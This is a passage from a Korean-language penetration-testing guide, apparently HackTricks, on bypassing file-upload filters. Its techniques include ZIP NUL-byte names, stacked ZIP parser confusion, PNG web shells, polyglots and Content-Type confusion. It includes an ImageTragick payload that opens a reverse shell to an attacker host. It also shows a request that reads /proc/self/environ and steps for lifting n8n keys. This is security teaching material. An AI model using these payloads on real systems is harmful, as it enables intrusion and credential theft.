#    Replace the dot right after ".php" with 00 (NUL) => shell.php\x00.pdf
#    Tools: hexcurse, bless, bvi, wxHexEditor, etc.

# 4) Local validation behavior
php -r '$z=new ZipArchive; $z->open("null.zip"); echo $z->getNameIndex(0),"\n";'
# -> shows truncated at NUL (looks like ".pdf" suffix)
```
노트
- 파일 이름이 사용되는 두 곳(로컬 및 중앙 디렉터리)을 모두 변경하세요. 일부 도구는 추가 data descriptor 항목을 더 추가하기도 하므로, 존재하면 모든 name 필드를 조정하세요.
- payload 파일은 여전히 서버 측 magic/MIME sniffing을 통과해야 합니다. PHP를 PDF 스트림에 임베딩하면 헤더가 유효한 상태로 유지됩니다.
- enum/validation 경로와 extraction/write 경로가 문자열 처리 방식에서 불일치하는 경우에 작동합니다.

### 중첩/연결된 ZIPs (파서 불일치)

두 개의 유효한 ZIP 파일을 연결하면, 서로 다른 파서가 서로 다른 EOCD 레코드를 참조하는 blob이 생성됩니다. 많은 도구는 마지막 End Of Central Directory (EOCD)를 찾는 반면, 일부 라이브러리(예: 특정 워크플로우의 ZipArchive)는 발견한 첫 번째 아카이브를 파싱할 수 있습니다. 검증이 첫 번째 아카이브를 열거하는 동안 추출이 마지막 EOCD를 따르는 다른 도구로 수행되면, 정상적인 아카이브는 검사 항목을 통과하는 반면 악의적인 아카이브가 추출될 수 있습니다.

PoC:
```bash
# Build two separate archives
printf test > t1; printf test2 > t2
zip zip1.zip t1; zip zip2.zip t2

# Stack them
cat zip1.zip zip2.zip > combo.zip

# Different views
unzip -l combo.zip   # warns about extra bytes; often lists entries from the last archive
php -r '$z=new ZipArchive; $z->open("combo.zip"); for($i=0;$i<$z->numFiles;$i++) echo $z->getNameIndex($i),"\n";'
```
악용 패턴
- 허용되는 형식(예: PDF)의 정상 아카이브 하나와 차단된 확장자를 포함한 두 번째 아카이브(예: `shell.php`)를 만듭니다.
- 이들을 이어붙입니다: `cat benign.zip evil.zip > combined.zip`.
- 서버가 한 파서로는 검증(benign.zip로 인식)하지만 다른 파서로는 압축을 풀어(evil.zip을 처리) 차단된 파일이 추출 경로에 놓이게 됩니다.

## ImageTragic

이 취약점 **(ImageMagick , 7.0.1-1)** 을 악용하려면 이미지 확장자로 이 내용을 업로드하세요 (해당 [exploit](https://www.exploit-db.com/exploits/39767))
```
push graphic-context
viewbox 0 0 640 480
fill 'url(https://127.0.0.1/test.jpg"|bash -i >& /dev/tcp/attacker-ip/attacker-port 0>&1|touch "hello)'
pop graphic-context
```
## PNG에 PHP Shell 삽입

PNG 파일의 IDAT 청크에 PHP Shell을 삽입하면 특정 이미지 처리 작업을 효과적으로 우회할 수 있습니다. PHP-GD의 `imagecopyresized` 및 `imagecopyresampled` 함수는 각각 이미지 리사이징과 리샘플링에 흔히 사용되므로 이 맥락에서 특히 관련이 큽니다. 삽입된 PHP Shell이 이러한 작업에도 영향을 받지 않고 남아 있을 수 있다는 점은 특정 상황에서 큰 이점입니다.

이 기법의 방법론과 잠재적 응용을 포함한 자세한 분석은 다음 글에 제공됩니다: ["Encoding Web Shells in PNG IDAT chunks"](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/). 이 자료는 프로세스와 그 영향에 대한 포괄적인 이해를 제공합니다.

More information in: [https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/)

## Polyglot 파일

Polyglot 파일은 사이버보안에서 독특한 도구로, 여러 파일 포맷을 동시에 유효하게 가질 수 있는 카멜레온처럼 작동합니다. 흥미로운 예로는 [GIFAR](https://en.wikipedia.org/wiki/Gifar)가 있는데, 이는 GIF와 RAR 아카이브 기능을 동시에 수행하는 하이브리드입니다. 이러한 파일은 이 조합에 국한되지 않으며 GIF와 JS 또는 PPT와 JS 같은 조합도 가능합니다.

Polyglot 파일의 핵심 유용성은 파일 타입 기반으로 파일을 필터링하는 보안 조치를 우회할 수 있다는 점에 있습니다. 여러 애플리케이션에서는 잠재적으로 위험한 포맷(e.g., JS, PHP, 또는 Phar 파일)이 업로드되는 것을 막기 위해 JPEG, GIF, DOC 같은 특정 파일 타입만 업로드를 허용하는 것이 일반적입니다. 그러나 polyglot은 여러 파일 타입의 구조적 기준을 동시에 만족함으로써 이러한 제한을 은밀히 우회할 수 있습니다.

적응력이 높더라도 polyglot는 한계에 직면하기도 합니다. 예를 들어, polyglot가 PHAR 파일 (PHp ARchive)과 JPEG를 동시에 포함할 수 있다 하더라도, 업로드 성공 여부는 플랫폼의 파일 확장자 정책에 달려 있을 수 있습니다. 시스템이 허용 가능한 확장자에 대해 엄격하다면, polyglot의 단순한 구조적 이중성만으로는 업로드를 보장하지 못할 수 있습니다.

More information in: [https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a](https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a)

### PDF인 척 하여 유효한 JSON 업로드하기

허용되지 않더라도 PDF로 위조하여 유효한 JSON 파일을 업로드함으로써 파일 타입 탐지를 회피하는 방법 (기법 출처: **[this blog post](https://blog.doyensec.com/2025/01/09/cspt-file-upload.html)**):

- **`mmmagic` library**: `%PDF` 매직 바이트가 처음 1024 바이트 이내에 있으면 유효하다 (예제는 포스트 참조)
- **`pdflib` library**: JSON의 필드 내부에 가짜 PDF 포맷을 추가하여 라이브러리가 이를 PDF로 인식하게 한다 (예제는 포스트 참조)
- **`file` binary**: 파일에서 최대 1048576 바이트까지 읽을 수 있다. 이보다 큰 JSON을 생성해 도중에 JSON으로 파싱하지 못하게 한 다음, 그 JSON 안에 실제 PDF의 초기 부분을 넣으면 file은 이를 PDF로 간주한다

### Content-Type 혼동을 통한 임의 파일 읽기

일부 업로드 핸들러는 요청 본문을 파싱한 결과를 **신뢰한다** (예: `context.getBodyData().files`) 그리고 먼저 `Content-Type: multipart/form-data`를 강제하지 않고 나중에 `file.filepath`로부터 파일을 **복사**합니다. 서버가 `application/json`을 허용한다면, `filepath`가 **임의의 로컬 경로**를 가리키도록 하는 가짜 `files` 객체를 제공하여 업로드 흐름을 임의 파일 읽기 프리미티브로 바꿀 수 있습니다.

업로드된 바이너리를 HTTP 응답으로 반환하는 폼 워크플로우에 대한 예제 POST:
```http
POST /form/vulnerable-form HTTP/1.1
Host: target
Content-Type: application/json

{
"files": {
"document": {
"filepath": "/proc/self/environ",
"mimetype": "image/png",
"originalFilename": "x.png"
}
}
}
```
백엔드가 `file.filepath`를 복사하므로, 응답은 해당 경로의 내용을 반환한다.  
일반적인 흐름: `/proc/self/environ`을 읽어 `$HOME`을 확인한 뒤, `$HOME/.n8n/config`에서 키를, `$HOME/.n8n/database.sqlite`에서 사용자 식별자를 얻는다.

## 참고자료

- [n8n form upload Content-Type confusion → arbitrary file read PoC](https://github.com/Chocapikk/CVE-2026-21858)
- [When Audits Fail: Four Critical Pre-Auth Vulnerabilities in TRUfusion Enterprise](https://www.rcesecurity.com/2025/09/when-audits-fail-four-critical-pre-auth-vulnerabilities-in-trufusion-enterprise/)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20insecure%20files](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20insecure%20files)
- [https://github.com/modzero/mod0BurpUploadScanner](https://github.com/modzero/mod0BurpUploadScanner)
- [https://github.com/almandin/fuxploider](https://github.com/almandin/fuxploider)
- [https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html](https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html)
- [https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/)
- [https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a](https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a)
- [https://blog.doyensec.com/2025/01/09/cspt-file-upload.html](https://blog.doyensec.com/2025/01/09/cspt-file-upload.html)
- [usd HeroLab – Gibbon LMS arbitrary file write (CVE-2023-45878)](https://herolab.usd.de/security-advisories/usd-2023-0025/)
- [NVD – CVE-2023-45878](https://nvd.nist.gov/vuln/detail/CVE-2023-45878)
- [0xdf – HTB: TheFrizz](https://0xdf.gitlab.io/2025/08/23/htb-thefrizz.html)
- [The Art of PHP: CTF‑born exploits and techniques](https://blog.orange.tw/posts/2025-08-the-art-of-php-ch/)
- [CVE-2024-21546 – NVD entry](https://nvd.nist.gov/vuln/detail/CVE-2024-21546)
- [PoC gist for LFM .php. bypass](https://gist.github.com/ImHades101/338a06816ef97262ba632af9c78b78ca)
- [0xdf – HTB Environment (UniSharp LFM upload → PHP RCE)](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)
- [HTB: Media — WMP NTLM leak → NTFS junction to webroot RCE → FullPowers + GodPotato to SYSTEM](https://0xdf.gitlab.io/2025/09/04/htb-media.html)
- [Microsoft – mklink (command reference)](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)
- [0xdf – HTB: Certificate (ZIP NUL-name and stacked ZIP parser confusion → PHP RCE)](https://0xdf.gitlab.io/2025/10/04/htb-certificate.html)

{{#include ../../banners/hacktricks-training.md}}
